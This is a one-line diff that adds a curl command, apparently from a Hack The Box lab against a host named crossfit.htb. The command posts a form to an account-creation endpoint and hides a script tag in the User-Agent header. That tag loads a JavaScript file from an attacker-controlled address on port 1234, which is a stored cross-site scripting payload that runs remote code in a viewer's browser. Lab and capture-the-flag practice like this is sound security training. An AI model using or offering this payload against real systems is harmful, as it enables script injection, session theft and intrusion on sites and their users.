@@ -1,0 +1,1 @@
+curl -s -X 'POST' \ -H "User-Agent: <script src=\"http://10.10.16.110:1234/explot.js\"></script>" \ --data-binary 'name=hacked&email=hacked@htb&phone=12345&message=<script>&submit=submit' \ 'http://ftp.crossfit.htb/accounts/create'
